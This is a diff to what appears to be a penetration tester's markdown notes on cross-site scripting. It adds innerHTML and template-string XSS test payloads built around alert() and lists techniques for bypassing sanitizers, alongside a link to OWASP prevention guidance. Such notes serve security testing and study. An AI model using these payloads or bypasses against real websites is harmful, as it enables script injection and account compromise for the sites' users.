@@ -6,7 +6,7 @@
 [https://theswissbay.ch/pdf/Gentoomen%20Library/Security/Cross%20Site%20Scripting%20Attacks%20Xss%20Exploits%20and%20Defense.pdf](https://theswissbay.ch/pdf/Gentoomen%20Library/Security/Cross%20Site%20Scripting%20Attacks%20Xss%20Exploits%20and%20Defense.pdf)\
 
 
-
+<figure><img src="../.gitbook/assets/XSS.jpg" alt=""><figcaption></figcaption></figure>
 
 Check how values are sanitized by the server\
 How many ways you can raise an error
@@ -178,6 +178,33 @@ eval(location.href.slice(55,66))
 </script>
 ```
 
+```
+// innerHTMl
+
+.innerHTML Cross-site Scripting
+<php> it mutates into <!--php-->, because browsers don't like to render PHP sources if sent accidentally.
+
+<?>
+<!+>
+
+<?><img%20src=""%20onerror="alert(1337)">
+```
+
+```
+Exploiting Template Strings with XSS
+
+${alert(1)}
+alert(1)
+${alert(1)}
+alert(1);
+${alert(1)};
+`alert(1)`
+`${alert(1)}`
+`${alert(1)}`;
+alert(1);
+${alert(1)}/*
+```
+
 ## Tips
 
 Code-split : | , ; , enter + code, +, -, /, , , %,^,&,\*, <, >
@@ -193,7 +220,12 @@ Depending on situation
 If JavaScript code sanitizes `<` and `>` characters, it indicates that it's trying to prevent HTML injection and potentially XSS attacks. However, there are ways attackers can still attempt XSS, such as using alternative encodings or bypassing the sanitizer logic. Here are a few techniques they might try:
 
 1. **Using Hex Encoding**: Instead of `<` and `>`, attackers might try using their hexadecimal equivalents (`%3C` for `<` and `%3E` for `>`). Some sanitizers may miss these encoded forms.
-2. **Using Unicode Encoding**: Attackers might use Unicode encoding to represent `<` and `>` characters. For example, `\u003C` for `<` and `\u003E` for `>`.
-3. **Using Alternative Tags**: Instead of `<script>` tags, attackers might try using alternative tags that the sanitizer may not detect as executable code. For example, `<img>` tags with JavaScript in the `src` attribute, or even uncommon HTML tags.
-4. **Event Handlers**: Attackers can try using event handlers like `onmouseover` or `onerror` to execute JavaScript code without directly injecting `<script>` tags.
-5. **CSS Injection**: Although less common, attackers might try injecting CSS code that includes JavaScript execution, such as using the `expression()` function in old versions of Internet Explorer.
+2.
+3. **Using Unicode Encoding**: Attackers might use Unicode encoding to represent `<` and `>` characters. For example, `\u003C` for `<` and `\u003E` for `>`.
+4. **Using Alternative Tags**: Instead of `<script>` tags, attackers might try using alternative tags that the sanitizer may not detect as executable code. For example, `<img>` tags with JavaScript in the `src` attribute, or even uncommon HTML tags.
+5. **Event Handlers**: Attackers can try using event handlers like `onmouseover` or `onerror` to execute JavaScript code without directly injecting `<script>` tags.
+6. **CSS Injection**: Although less common, attackers might try injecting CSS code that includes JavaScript execution, such as using the `expression()` function in old versions of Internet Explorer.
+
+<figure><img src="../.gitbook/assets/https___dev-to-uploads.s3.amazonaws.com_uploads_articles_ch5db4qms1k0iwz870ah .jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md" %}
